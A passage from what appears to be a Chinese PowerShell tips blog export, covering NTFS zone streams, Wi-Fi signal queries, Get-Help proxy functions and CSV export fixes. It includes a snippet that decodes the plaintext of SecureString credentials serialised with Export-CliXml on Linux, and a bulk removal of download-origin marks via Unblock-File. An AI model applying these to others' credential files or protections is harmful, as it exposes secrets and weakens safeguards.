驱动器上即可。接下来，使用此行查看区域标识符： 1Get-Content -Path C:\\users\\tobia\\Downloads\\Flyer2021.rar -Stream Zone.Identifier 如果存在该流，则您会看到类似以下信息： [ZoneTransfer] ZoneId=3 ReferrerUrl=https://shop.laserkino.de/ HostUrl=https://www.somecompany/Flyer2021.rar 它暴露了文件的来源以及从中检索文件的远程区域的类型。如果没有附加到文件的区域信息，则上述命令将引发异常。 若要从文件中删除区域信息（并删除所有限制），请使用 Unblock-File cmdlet。例如，要取消阻止“下载”文件夹中的所有文件，请尝试以下操作： 1Get-ChildItem -Path C:\\users\\tobia\\Downloads\\ -File | Unblock-File -WhatIf 删除 -WhatIf 参数以实际删除该保护流。","link":"/2021/04/15/working-with-ntfs-streams-part-4/"},{"title":"PowerShell 技能连载 - 使用 NTFS 流（第 5 部分）","text":"在前面的技能中，我们研究了 NTFS 流，并发现 Windows 如何使用“区域信息”流标记下载的文件。您还学习了使用 Unblock-File 从文件中删除此限制。 在最后一部分中，我们做了相反的事情，查找从不受信任的来源下载的文件。例如，此行列出了所有附加了 Zone.Identifier 流的文件： 1234$path = &quot;$env:userprofile\\Downloads&quot;Get-ChildItem -Path $Path -file | Where-Object { @(Get-Item -Path $_.FullName -Stream *).Stream -contains 'Zone.Identifier' } 所有这些文件都来自 Windows 认为不一定可信的来源。 要了解更多信息，您必须阅读附件中的信息流。这段代码揭示了“下载”文件夹中所有“区域信息”流的全部内容： 1234567$path = &quot;$env:userprofile\\Downloads&quot;Get-ChildItem -Path $Path -file | Where-Object { @(Get-Item -Path $_.FullName -Stream *).Stream -contains 'Zone.Identifier' } | ForEach-Object { Get-Content -Path $_.FullName -Stream Zone.Identifier } 显然，该信息包含有关引用和来源的信息，因此您可以还原此信息并找出在“下载”文件夹中找到的所有内容的来源： 1234567891011121314$path = &quot;$env:userprofile\\Downloads&quot;Get-ChildItem -Path $Path -file | Where-Object { @(Get-Item -Path $_.FullName -Stream *).Stream -contains 'Zone.Identifier' } | ForEach-Object { $info = Get-Content -Path $_.FullName -Stream Zone.Identifier [PSCustomObject]@{ Name = $_.Name Referrer = @(($info -like 'ReferrerUrl=*').Split('='))[-1] HostUrl = @(($info -like 'HostUrl=*').Split('='))[-1] Path = $_.FullName } } | Out-GridView 这使您可以很好地了解下载的原始来源。","link":"/2021/04/19/working-with-ntfs-streams-part-5/"},{"title":"PowerShell 技能连载 - 查找系统路径","text":"有时，脚本需要知道用户桌面或开始菜单等的路径。这些路径可能会有所不同，尤其是在用户使用 OneDrive 时。要找到当前系统路径，请使用以下代码： 12PS&gt; [Environment]::GetFolderPath('Desktop')C:\\Users\\tobia\\OneDrive\\Desktop 您可以使用 [System.Environment+SpecialFolder] 类型中定义的所有常量： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849PS&gt; [Enum]::GetNames([System.Environment+SpecialFolder])DesktopProgramsMyDocumentsPersonalFavoritesStartupRecentSendToStartMenuMyMusicMyVideosDesktopDirectoryMyComputerNetworkShortcutsFontsTemplatesCommonStartMenuCommonProgramsCommonStartupCommonDesktopDirectoryApplicationDataPrinterShortcutsLocalApplicationDataInternetCacheCookiesHistoryCommonApplicationDataWindowsSystemProgramFilesMyPicturesUserProfileSystemX86ProgramFilesX86CommonProgramFilesCommonProgramFilesX86CommonTemplatesCommonDocumentsCommonAdminToolsAdminToolsCommonMusicCommonPicturesCommonVideosResourcesLocalizedResourcesCommonOemLinksCDBurning 如果您知道该路径，并且想知道是否有可以使用的已注册系统路径，请尝试相反的方法并转储所有文件夹常量及其关联的路径： 123456789[Enum]::GetNames([System.Environment+SpecialFolder]) | ForEach-Object { # ...for each, create a new object with the constant, the associated path # and the code required to get that path [PSCustomObject]@{ Name = $_ Path = [Environment]::GetFolderPath($_) } } 结果看起来像这样： Name Path ---- ---- Desktop C:\\Users\\tobia\\OneDrive\\Desktop Programs C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Pr... MyDocuments C:\\Users\\tobia\\OneDrive\\Dokumente Personal C:\\Users\\tobia\\OneDrive\\Dokumente Favorites C:\\Users\\tobia\\Favorites Startup C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Pr... Recent C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Recent SendTo C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\SendTo StartMenu C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu MyMusic C:\\Users\\tobia\\Music MyVideos C:\\Users\\tobia\\Videos DesktopDirectory C:\\Users\\tobia\\OneDrive\\Desktop MyComputer NetworkShortcuts C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Network Short... Fonts C:\\WINDOWS\\Fonts Templates C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Templates CommonStartMenu C:\\ProgramData\\Microsoft\\Windows\\Start Menu CommonPrograms C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs CommonStartup C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup CommonDesktopDirectory C:\\Users\\Public\\Desktop ApplicationData C:\\Users\\tobia\\AppData\\Roaming PrinterShortcuts C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Printer Short... LocalApplicationData C:\\Users\\tobia\\AppData\\Local InternetCache C:\\Users\\tobia\\AppData\\Local\\Microsoft\\Windows\\INetCache Cookies C:\\Users\\tobia\\AppData\\Local\\Microsoft\\Windows\\INetCookies History C:\\Users\\tobia\\AppData\\Local\\Microsoft\\Windows\\History CommonApplicationData C:\\ProgramData Windows C:\\WINDOWS System C:\\WINDOWS\\system32 ProgramFiles C:\\Program Files MyPictures C:\\Users\\tobia\\OneDrive\\Bilder UserProfile C:\\Users\\tobia SystemX86 C:\\WINDOWS\\SysWOW64 ProgramFilesX86 C:\\Program Files (x86) CommonProgramFiles C:\\Program Files\\Common Files CommonProgramFilesX86 C:\\Program Files (x86)\\Common Files CommonTemplates C:\\ProgramData\\Microsoft\\Windows\\Templates CommonDocuments C:\\Users\\Public\\Documents CommonAdminTools C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Administr... AdminTools C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Pr... CommonMusic C:\\Users\\Public\\Music CommonPictures C:\\Users\\Public\\Pictures CommonVideos C:\\Users\\Public\\Videos Resources C:\\WINDOWS\\resources LocalizedResources CommonOemLinks CDBurning C:\\Users\\tobia\\AppData\\Local\\Microsoft\\Windows\\Burn\\Burn #","link":"/2021/04/21/finding-system-paths/"},{"title":"PowerShell 技能连载 - 识别组成员身份","text":"如果您的脚本需要知道当前用户是否是给定组的成员，那么最快且耗费最少资源的方法是使用如下代码： 123456$token = [System.Security.Principal.WindowsIdentity]::GetCurrent()$xy = 'S-1-5-64-36'if ($token.Groups -contains $xy){ &quot;You're in this group.&quot;} 当当前用户是由 SID S-1-5-64-36 标识的组的直接或间接成员时，该示例将执行代码（将该 SID 替换为所需的组的 SID）。 这段代码访问用户已经存在并且始终有权访问的访问令牌。无需额外耗时进行 AD 查询，并且嵌套组成员身份也没有问题。访问令牌具有当前用户所属的直接和间接组的完整列表。 所有组均按 SID 列出，这很有意义。再次解析 SID 名称既耗时又毫无意义。如果您只想知道用户是否是组的成员，则只需找出该组的 SID（即使用 Get-AdGroup），然后在上述方法中使用此 SID 即可。","link":"/2021/04/23/identifying-group-memberships/"},{"title":"PowerShell 技能连载 - 快速初始化多个PowerShell控制台","text":"假设您是许多领域的管理员，例如，Azure、SharePoint、SQL、Microsoft 365。对于每种环境，您可能需要运行一些先决条件，登录某些系统并运行一些命令，直到您的 PowerShell 环境准备好为止。 这是一个简单的策略，可以帮助您自动启动不同的PowerShell控制台。在新文件夹中，放置一个具有以下内容的脚本： 12345678910111213141516171819202122# safely serialize a credential$credPath = &quot;$PSScriptRoot\\secret.xml&quot;$exists = Test-Path -Path $credPathif (!$exists){ $cred = Get-Credential $cred | Export-Clixml -Path $credPath}# define your different environments$action = @{ 'Azure' = &quot;$PSScriptRoot\\azure.ps1&quot; 'Teams' = &quot;$PSScriptRoot\\teams.ps1&quot; 'Office' = &quot;$PSScriptRoot\\office.ps1&quot;}# run a new PowerShell for each environment, and run the# associated &quot;spin-up&quot; script:$action.Keys | ForEach-Object { $path = $action[$_] Start-Process -FilePath powershell -ArgumentList &quot;-noexit -noprofile -executionpolicy bypass -file &quot;&quot;$path&quot;&quot;&quot;} 该示例启动了三个 PowerShell 控制台，并为每个控制台运行一个单独的启动脚本。通过将脚本 azure.ps1，teams.ps1 和 office.ps1 添加到您的文件夹，您现在可以定义初始化和准备每个控制台所需的代码。您还可以通过从任何其他脚本中读取主凭据来使用公共凭据。这是一个例子： 1234# set the console title bar$host.UI.RawUI.WindowTitle = 'Administering Office'# read the common credential from file$cred = Import-Clixml -Path &quot;$PSScriptRoot\\secret.xml&quot;","link":"/2021/04/27/quickly-initializing-multiple-powershell-consoles/"},{"title":"PowerShell 技能连载 - Linux 如何保护安全字符串（实际未保护）","text":"当您在非 Windows 系统上的 PowerShell 中将对象序列化为 XML 时，即通过使用 Export-CliXml，所有 SecureString 数据仅被编码，而不被加密。这是根本的区别，也是安全代码一旦移植到非 Windows 操作系统后可能变得不安全的原因。 例如，如果序列化凭据，则结果仅在 Windows 操作系统上是安全的： 1Get-Credential | Export-Clixml -Path $env:temp\\secret.xml 在 XML 文件中，您可以看到 Export-CliXml 如何更改 SecureString 的表示形式并将其转换为十六进制值的列表。在 Windows 上，SecureString 数据已安全加密，并且只有加密数据的人员（并且正在使用该计算机时）才能读取。在 Linux 和 macOS 上并非如此。由于此处缺少 Windows 加密API，因此仅对 SecureString 进行编码而不是加密。 要在非 Windows 操作系统上解码序列化 XML 内容中的纯文本内容，请尝试如下代码： 123$secret = '53007500700065007200530065006300720065007400' $bytes = $secret -split '(?&lt;=\\G.{2})(?=.)' |ForEach-Object { [Convert]::ToByte($_, 16)}$plain = [Text.Encoding]::Unicode.GetString($bytes)$plain 它采用编码字符串，将其分成两对，将十六进制值转换为十进制值，并通过相应的 Unicode 解码器运行结果字节。结果就是原始的密文。 简而言之，请记住，仅在 Windows 操作系统上对序列化的 SecureString 进行安全加密。在 Linux 和 macOS 上，将敏感数据发送到 Export-CliXml 不会对其进行保护。","link":"/2021/04/29/how-linux-protects-securestrings-not/"},{"title":"PowerShell 技能连载 - 检测 Wi-Fi 信号强度（第 1 部分）","text":"如果您已连接到无线网络，则以下这行代码可提供当前信号强度： 12PS&gt; @(netsh wlan show interfaces) -match '^\\s+Signal' -replace '^\\s+Signal\\s+:\\s+',''80% 信号强度来自 netsh.exe 提供的文本输出。将其包含在 @() 中可确保它始终返回一个数组。然后，-match 运算符使用正则表达式来标识在行首包含单词 “Signal” 的行。后面的 -replace 运算符使用正则表达式删除信号强度之前的文本。 如果您不喜欢正则表达式，则可以使用其他方法来实现，例如： 12PS&gt; (@(netsh wlan show interfaces).Trim() -like 'Signal*').Split(':')[-1].Trim()80% 这段代码中，将首先修剪 netsh.exe 返回的每一行（删除两端的空白）。接下来，经典的 -like 运算符选择以 “Signal” 开头的行。然后用 “:” 分隔该行，并使用最后一部分（索引为 -1）。再次清除信号强度两端的空白。 如果两个命令均未返回任何内容，请检查您的计算机是否已连接到无线网络。您可能还希望仅使用 netsh.exe 命令的参数来运行它，而没有任何文本运算符来查看命令的原始输出。","link":"/2021/05/03/identifying-wi-fi-signal-strength-part-1/"},{"title":"PowerShell 技能连载 - 检测 Wi-Fi 信号强度（第 2 部分）","text":"在上一个技能中，我们使用 netsh.exe 来确定 Wi-Fi 信号强度。由于 netsh.exe 返回的是原始格式的文本，因此需要大量的文本运算符技巧来提取实际的信号强度。通过调用结构化的 API 和对象成员直接访问信息始终是更优的方法。 坦白地说，没有内置的 PowerShell 方法可以以面向对象和结构化的方式访问 Wi-Fi 信息。但是，借助 PowerShell Gallery 中的免费 PowerShell 模块，您可以检索大量有用的 Wi-Fi 信息： 1Install-Module -Name Get-WLANs -Scope CurrentUser -Force 该模块基本上随附访问任何最新 Windows 操作系统中存在的内置 Windows “Managed Wi-Fi” 框架所需的 C# 代码。 安装该模块后，新命令 Get-WLANs 将返回有关所有可访问的 Wi-Fi 网络的面向对象的信息： 12345678910111213141516171819202122PS&gt; Get-WLANsSSID : internetcafeBSSID : 38:96:ED:0E:31:ADRSSI : -63QUALITY : 81FREQ : 5180CHANNEL : 36PHY : VHTCAPABILITY : 0x1511IESIZE : 393SSID : guestsBSSID : 3E:96:ED:0E:31:ADRSSI : -69QUALITY : 70FREQ : 5180CHANNEL : 36PHY : VHTCAPABILITY : 0x1511IESIZE : 286(...) 这也包括有关信号强度的信息（在 Quality 属性中）。","link":"/2021/05/05/identifying-wi-fi-signal-strength-part-2/"},{"title":"PowerShell 技能连载 - 检测 Wi-Fi 信号强度（第 3 部分）","text":"在上一个技巧中，我们介绍了免费的 PowerShell 模块 Get-WLANs ，该模块可以访问 Windows Wi-Fi 框架并返回信息，例如信号强度。这是下载并安装它的命令： 1Install-Module -Name Get-WLANs -Scope CurrentUser -Force 尽管您可以简单地使用其新命令 Get-WLANs（如上一技巧中所述），但该模块还添加了一个新的 .NET 类型，您可以在运行该命令后使用它。首先运行此命令以初始化新的 .NET 类型： 12# &quot;initialize&quot; the new type$null = Get-WLANs 接下来，创建一个原生的 “WlanClient” 对象： 1$wc = [NativeWifi.WlanClient]::New() 现在，您可以转储有关系统中所有可用的 Wi-Fi 适配器的所有技术细节： 123456789101112131415PS&gt; $wc.InterfacesAutoconf : TrueBssType : AnyInterfaceState : ConnectedChannel : 36RSSI : 29RadioState : NativeWifi.Wlan+WlanRadioStateCurrentOperationMode : ExtensibleStationCurrentConnection : NativeWifi.Wlan+WlanConnectionAttributesNetworkInterface : System.Net.NetworkInformation.SystemNetworkInterfaceInterfaceGuid : 7d6c33b7-0354-4ad7-a72f-5a1a5cbb1a9bInterfaceDescription : Killer(R) Wi-Fi 6 AX1650s 160MHz Wireless Network Adapter (201D2W)InterfaceName : WLAN “Interfaces“ 属性返回一个数组，因此您的第一个 Wi-Fi 适配器由以下形式表示： 1$wc.Interfaces[0] 它提供了很多方法，例如，检索可访问的可用 Wi-Fi 网络列表。这将扫描新的网络： 12$wc.Interfaces[0].Scan()Start-Sleep -Seconds 1 以下代码转储可使用的网络列表（包括信号强度，频率和信道）： 123456789101112131415161718PS&gt; $wc.Interfaces[0].GetAvailableNetworkList(3)Dot11PhyTypes : {8}profileName : internetcafedot11Ssid : NativeWifi.Wlan+Dot11Ssiddot11BssType : InfrastructurenumberOfBssids : 3networkConnectable : TruewlanNotConnectableReason : SuccessmorePhyTypes : FalsewlanSignalQuality : 81securityEnabled : Truedot11DefaultAuthAlgorithm : RSNA_PSKdot11DefaultCipherAlgorithm : CCMPflags : Connected, HasProfile(...) 此对象模型为提供了丰富的方法和属性来控制和管理 Wi-Fi 网络适配器。例如，此代码转储可用的 SSID 列表及其信号强度： 1234567891011$ssid = @{ N='SSID' E={ [System.Text.Encoding]::Ascii.GetString( $_.dot11ssid.SSID, 0, $_.dot11ssid.SSIDLength ) }}$wc.Interfaces[0].GetAvailableNetworkList(3) | Select-Object -Property $ssid, wlanSignalQuality, profileName | Where-Object SSID 结果看起来类似这样： SSID wlanSignalQuality profileName ---- ----------------- ----------- internetcafe 81 internetcafe internetcafe 87 internetcafe 2 internetcafe 87 DIRECT-fb-HP M477 LaserJet 31 Guest 67","link":"/2021/05/07/identifying-wi-fi-signal-strength-part-3/"},{"title":"PowerShell 技能连载 - 更好的 PowerShell 帮助（第 1 部分）","text":"许多 cmdlet 提供了丰富的联机帮助，您可以使用 Get-Help 并加上 -Online 参数来自动打开 cmdlet 的网页： 1PS&gt; Get-Help -Name Get-Service -Online 每个 cmdlet 还支持公用参数 -?。不过，它仅显示了有限的内置本地帮助： 123456789PS&gt; Get-Service -?NAME Get-ServiceSYNTAX Get-Service [-ComputerName &lt;System.String[]&gt;] [-DependentServices] -DisplayName &lt;System.String[]&gt; [-Exclude &lt;System.String[]&gt;] [-Include &lt;System.String[]&gt;] [-RequiredServices] []... 但是，您可以通过一个简单的技巧告诉 PowerShell 也对内置参数 -? 使用丰富的联机帮助。请运行这段代码： 1PS&gt; $PSDefaultParameterValues['Get-Help:Online'] = $true 此命令自动为 Get-Help -Online 参数设置一个新的默认值，并且因为 -? 内部使用 Get-Help，您现在只需添加 -? 到命令名称就可以获得大多数 PowerShell cmdlet 的丰富在线帮助。 1PS&gt; Get-Service -? 真是太棒了，因此您可能需要将该命令添加到自动启动配置文件脚本中。该脚本的路径可以在 $profile.CurrentUserAllHosts 中找到。它可能尚不存在，所以您可能必须创建它。 但是，有一个警告：如果命令没有在线帮助，那么您现在会收到一条错误消息，提示没有在线帮助。在即将发布的技能中，我们将单独解决此问题。","link":"/2021/05/11/better-powershell-help-part-1/"},{"title":"PowerShell 技能连载 - 更好的 PowerShell 帮助（第 2 部分）","text":"在上一个技能中，我们更改了 Get-Help 的默认参数值，以在您使用 Get-Help 或通用参数 -? 时自动显示丰富的联机帮助。但是，当 cmdlet 没有联机帮助时，此方法会产生错误。 更好的方法是首先检查给定命令是否存在联机帮助，然后才打开联机帮助。如果没有在线帮助，则应显示默认的本地帮助。 此方法无法通过默认参数实现。相反，Get-Help cmdlet 本身需要进行调整。要将逻辑添加到 Get-Help，可以使用以下代理函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function Get-Help{ \\# clone the original param block taken from Get-Help [CmdletBinding(DefaultParameterSetName='AllUsersView', HelpUri='https://go.microsoft.com/fwlink/?LinkID=113316')] param( [Parameter(Position=0, ValueFromPipelineByPropertyName)] [string] $Name, [Parameter(ParameterSetName='Online', Mandatory)] [switch] $Online, [ValidateSet('Alias','Cmdlet','Provider','General','FAQ','Glossary','HelpFile','ScriptCommand','Function','Filter','ExternalScript','All','DefaultHelp','Workflow','DscResource','Class','Configuration')] [string[]] $Category, [string] $Path, [string[]] $Component, [string[]] $Functionality, [string[]] $Role, [Parameter(ParameterSetName='DetailedView', Mandatory)] [switch] $Detailed, [Parameter(ParameterSetName='AllUsersView')] [switch] $Full, [Parameter(ParameterSetName='Examples', Mandatory)] [switch] $Examples, [Parameter(ParameterSetName='Parameters', Mandatory)] [string] $Parameter, [Parameter(ParameterSetName='ShowWindow', Mandatory)] [switch] $ShowWindow ) begin { \\# determine whether -Online should be made a default if ( \\# user submitted -Name only ( $PSBoundParameters.Count -eq 1 -and $PSBoundParameters.ContainsKey('Name') ) -or \\# system submitted -Name and -Category (when using -?) ( $PSBoundParameters.Count -eq 2 -and $PSBoundParameters.ContainsKey('Name') -and $PSBoundParameters.ContainsKey('Category') ) ) { \\# prerequisites are OK, now check whether there IS online help \\# available at all \\# retrieve the help URI $help = Microsoft.PowerShell.Core\\Get-Command -Name $Name \\# set the -Online parameter only if there is a help URI $PSBoundParameters['Online']= [string]::IsNullOrWhiteSpace($help.HelpUri) -eq $false } \\# once the parameter adjustment has been processed, call the original \\# Get-Help cmdlet with the parameters found in $PSBoundParameters \\# turn the original Get-Help cmdlet into a proxy command receiving the \\# adjusted parameters \\# with a proxy command, you can invoke its begin, process, and end \\# logic separately. That's required to preserve pipeline functionality $cmd = Get-Command -Name 'Get-Help' -CommandType Cmdlet $proxy = {&amp; $cmd @PSBoundParameters}. GetSteppablePipeline($myInvocation.CommandOrigin) \\# now, call its default begin, process, and end blocks in the appropriate \\# script blocks so it integrates in real-time pipelines $proxy.Begin($PSCmdlet) } process { $proxy.Process($_) } end { $proxy.End() } \\# use the original help taken from Get-Help for this function &lt;# .ForwardHelpTargetName Microsoft.PowerShell.Core\\Get-Help .ForwardHelpCategory Cmdlet \\#&gt;} 运行此代码时，Get-Help 函数现在将覆盖原始的 Get-Help cmdlet。在内部，该函数调用原生的 cmdlet，但在此之前，该函数检查 -Online 是否应设为默认参数。 现在，仅当用户未提交任何有冲突的参数时才发生这种情况，并且仅当首先有可用于所请求命令的联机帮助时才发生这种情况。 现在，无论何时使用 Get-Help 或通用参数 -?，您都会获得丰富的在线帮助（如果可用）或本地默认帮助。 试试以下代码： 1234567PS&gt; Get-Service -?PS&gt; Connect-IscsiTarget -?PS&gt; Get-Help Get-ServicePS&gt; Get-Help Get-Service -ShowWindow 由于有可用于 Get-Service 的联机帮助，因此第一个调用将打开浏览器窗口并显示帮助。第二个调用说明了没有可用的联机帮助时发生的情况：此处未将 “-Online“ 作为默认参数，而是显示了默认的本地帮助。 第三和第四次调用说明 Get-Help 仍然可以正常运行。默认情况下，该命令现在会打开联机帮助，但是如果您添加其他参数（例如 -ShowWindow），它们仍将按预期运行。 如果您喜欢此功能，则应将其添加到您的配置文件脚本中。 注意：如果您已通过 $PSDefaultParameter 为 Get-Help 设置了任何默认参数（即，按照前面的提示进行操作时），则这些参数将生效，并且上面的功能无法为您带来任何改善。 确保您没有定义任何会影响 “Get-Help“ 的默认参数： 1PS&gt; $PSDefaultParameterValues.Keys.ToLower() -like 'get-help*'","link":"/2021/05/13/better-powershell-help-part-2/"},{"title":"PowerShell 技能连载 - 更好的 PowerShell 帮助（第 3 部分）","text":"在上一个技能中，我们使用自定义代理功能对原始的 Get-Help cmdlet 进行了“影子”处理。该功能检查命令是否存在联机帮助，如果存在，则默认情况下会打开丰富的联机帮助。这极大地改善了 PowerShell 中的帮助体验。 但是，通过简单的调整，您可以使该功能更进一步：为什么不同时检查另一种方式呢？如果用户使用 -Online 参数，但是没有在线帮助，则 Get-Help 会抛出一个丑陋的异常。显示内置的本地帮助而不是抛出异常，不是更好吗？ 当用户将 Get-Help 的默认值设置为 -Online 时，也可使该函数能适应 $PSDefaultParameterValue 的调整。 这是更新的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445function Get-Help{ \\# clone the original param block taken from Get-Help [CmdletBinding(DefaultParameterSetName='AllUsersView', HelpUri='https://go.microsoft.com/fwlink/?LinkID=113316')] param( [Parameter(Position=0, ValueFromPipelineByPropertyName)] [string] $Name, [Parameter(ParameterSetName='Online', Mandatory)] [switch] $Online, [ValidateSet('Alias','Cmdlet','Provider','General','FAQ','Glossary','HelpFile','ScriptCommand','Function','Filter','ExternalScript','All','DefaultHelp','Workflow','DscResource','Class','Configuration')] [string[]] $Category, [string] $Path, [string[]] $Component, [string[]] $Functionality, [string[]] $Role, [Parameter(ParameterSetName='DetailedView', Mandatory)] [switch] $Detailed, [Parameter(ParameterSetName='AllUsersView')] [switch] $Full, [Parameter(ParameterSetName='Examples', Mandatory)] [switch] $Examples, [Parameter(ParameterSetName='Parameters', Mandatory)] [string] $Parameter, [Parameter(ParameterSetName='ShowWindow', Mandatory)] [switch] $ShowWindow ) begin { \\# we do the adjustments only when the user has submitted \\# the -Name, -Category, and -Online parameters if ( (@($PSBoundParameters.Keys) -ne 'Name' -ne 'Category' -ne 'Online'). Count -eq 0 ) { \\# check whether there IS online help available at all \\# retrieve the help URI $help = Microsoft.PowerShell.Core\\Get-Command -Name $Name \\# reset the parameter -Online based on availability of online help $PSBoundParameters['Online']= [string]::IsNullOrWhiteSpace($help.HelpUri) -eq $false } \\# once the parameter adjustment has been processed, call the original \\# Get-Help cmdlet with the parameters found in $PSBoundParameters \\# turn the original Get-Help cmdlet into a proxy command receiving the \\# adjusted parameters \\# with a proxy command, you can invoke its begin, process, and end \\# logic separately. That's required to preserve pipeline functionality $cmd = Get-Command -Name 'Get-Help' -CommandType Cmdlet $proxy = {&amp; $cmd @PSBoundParameters}. GetSteppablePipeline($myInvocation.CommandOrigin) \\# now, call its default begin, process, and end blocks in the appropriate \\# script blocks so it integrates in real-time pipelines $proxy.Begin($PSCmdlet) } process { $proxy.Process($_) } end { $proxy.End() } \\# use the original help taken from Get-Help for this function &lt;# .ForwardHelpTargetName Microsoft.PowerShell.Core\\Get-Help .ForwardHelpCategory Cmdlet \\#&gt;} 运行这段代码之后，无论使用 Get-Help，help 还是公共参数 -?，您的帮助系统现在都变得更加智能。 如果有可用于命令的联机帮助，则默认情况下显示： 123PS&gt; Get-Help Get-ServicePS&gt; Get-Service -? 如果没有可用的联机帮助，它将始终显示本地帮助（即使您不小心指定了 -Online 或使用 $PSDefaultParameterValue 来显式使用 -Online）： 123PS&gt; Connect-IscsiTarget -?PS&gt; Get-Help Connect-IscsiTarget -Online 并且，如果您指定其他参数，它们仍然可以按预期继续工作： 1PS&gt; Get-Help Get-Service -ShowWindow 本质上，该调整仅包含同时提供丰富在线帮助内容，并在可用时显示它。 如果您喜欢此功能，请将其添加到配置文件脚本中，以便在启动 PowerShell 时对其进行定义。路径可以在这里找到：$profile.CurrentUserAllHosts。","link":"/2021/05/17/better-powershell-help-part-3/"},{"title":"PowerShell 技能连载 - 导出不带引号的CSV（和其他转换技巧）","text":"PowerShell 附带了一堆 Export- 和 ConvertTo- cmdlet，因此您可以将对象数据序列化为 CSV、JSON、XML和其他格式。很好，但是创建自己的导出功能并不难。 例如，Windows PowerShell 中的 Export-Csv 始终对数值添加双引号。如果你不喜欢带双引号的 CSV，就不好办了。 PowerShell 7 已解决此问题，其中包含额外的参数，但创建自己的 Export-Csv 函数根本并不难。 这是一个简单的例子： 1234567891011121314151617181920212223242526function ConvertTo-MyCsv{ param ( [char] $Delimiter = ',' ) begin { $init = $false } process { # write the headers if ($init -eq $false) { $_.PSObject.Properties.Name -join $Delimiter $init = $true } # write the items $_.PSObject.Properties.Value -join $Delimiter }}$a = Get-Service | ConvertTo-MyCsv 这的确是所有的内容了：ConvertTo-MyCsv 将对象转换为没有双引号的 CSV，如果需要，甚至可以选择分隔符（默认为 “,“）。 要快速检查生成的CSV的完整性，请将其转换回对象： 1PS&gt; $a | ConvertFrom-CSV | Out-GridView 一切都很好，转换生效了。它不比 ConvertTo-Csv 慢。 显然，如果任何数据值包含分隔符（这就是为什么 ConvertTo-Csv 为它们添加双引号的原因），则转换将失败。但这不是这里的重点。您可以轻松微调函数。更重要的是，PowerShell 中将对象自动转换为文本的艺术。 要将对象转换为 CSV（或任何其他格式），只需访问隐藏的 PSObject 属性（可用于任何 PowerShell 对象）。它描述了对象，并提供所有属性名称，值和数据类型。","link":"/2021/05/19/exporting-csv-without-quotes-and-other-conversion-tricks/"},{"title":"PowerShell 技能连载 - 修复 CSV 导出（第 1 部分）","text":"当您将数据转换为 CSV 时，您可能会遇到一个很烦恼的情况：某些属性不是显示原始数据。下面是一个例子： 123456PS&gt; Get-Service | Select-Object -Property Name, DependentServices, RequiredServices | ConvertTo-Csv#TYPE Selected.System.ServiceProcess.ServiceController&quot;Name&quot;,&quot;DependentServices&quot;,&quot;RequiredServices&quot;&quot;AarSvc_e1277&quot;,&quot;System.ServiceProcess.ServiceController[]&quot;,&quot;System.ServiceProcess.ServiceController[]&quot;&quot;AdobeARMservice&quot;,&quot;System.ServiceProcess.ServiceController[]&quot;,&quot;System.ServiceProcess.ServiceController[]&quot; 如您所见，DependentServices 和 RequiredServices 属性和所有服务显示的内容是一样的。 当属性包含数组时会发生这种情况。扁平化二维导出格式（例如 CSV）无法显示数组，因此将显示数组数据类型。这对用户来说当然根本没有帮助。 在我们解决它之前先总结一下：您在这里看到的是许多场景中的严重问题。它不仅影响CSV导出，还影响导出为 Excel 或其他二维表格格式。 要解决这个问题，您必须将所有数组转换为字符串。您可以手动或自动执行此操作。在这个技能中，我们首先展示手动方法来关注效果。在未来的技能中，我们会自动执行相同的操作。 这是从上方正确导出所选数据的手动方法： 12345678910Get-Service | Select-Object -Property Name, DependentServices, RequiredServices | ForEach-Object { $_.DependentServices = $_.DependentServices -join ',' $_.RequiredServices = $_.RequiredServices -join ',' return $_ } | ConvertTo-Csv 数据现在显示所有数组内容，因为 ForEach-Object 循环已使用 -join 运算符将数组内容转换为逗号分隔的字符串。 &quot;Name&quot;,&quot;DependentServices&quot;,&quot;RequiredServices&quot; &quot;AppIDSvc&quot;,&quot;applockerfltr&quot;,&quot;RpcSs,CryptSvc,AppID&quot; &quot;Appinfo&quot;,&quot;&quot;,&quot;RpcSs,ProfSvc&quot; &quot;AppVClient&quot;,&quot;&quot;,&quot;AppvVfs,RpcSS,AppvStrm,netprofm&quot; &quot;AppXSvc&quot;,&quot;&quot;,&quot;rpcss,staterepository&quot; &quot;AssignedAccessManagerSvc&quot;,&quot;&quot;,&quot;&quot; ... 只要您通过 Select-Object 操作原始数据，就可以进行这种“调整”：Select-Object 始终复制（克隆）信息，因此一旦 Select-Object 处理了数据，您就拥有这些对象并可以以任何方式更改其属性。","link":"/2021/05/21/repairing-csv-exports-part-1/"},{"title":"PowerShell 技能连载 - 修复 CSV 导出（第 2 部分）","text":"在上一个技能中，我们指出了将对象转换为 CSV 时的一个普遍问题：任何包含数组的属性都将显示数组数据类型而不是数组内容。下面是一个例子： 123456PS&gt; Get-Service | Select-Object -Property Name, DependentServices, RequiredServices | ConvertTo-Csv#TYPE Selected.System.ServiceProcess.ServiceController&quot;Name&quot;,&quot;DependentServices&quot;,&quot;RequiredServices&quot;&quot;AarSvc_e1277&quot;,&quot;System.ServiceProcess.ServiceController[]&quot;,&quot;System.ServiceProcess.ServiceController[]&quot;&quot;AdobeARMservice&quot;,&quot;System.ServiceProcess.ServiceController[]&quot;,&quot;System.ServiceProcess.ServiceController[]&quot; 在上一个技能中，我们还展示了该问题的手动解决方案：您总是可以使用 -join 运算符手动将任何数组属性的内容转换为字符串： 12345678910Get-Service | Select-Object -Property Name, DependentServices, RequiredServices | ForEach-Object { $_.DependentServices = $_.DependentServices -join ',' $_.RequiredServices = $_.RequiredServices -join ',' return $_ } | ConvertTo-Csv 数据现已“修复”，数组属性内容显示正确： 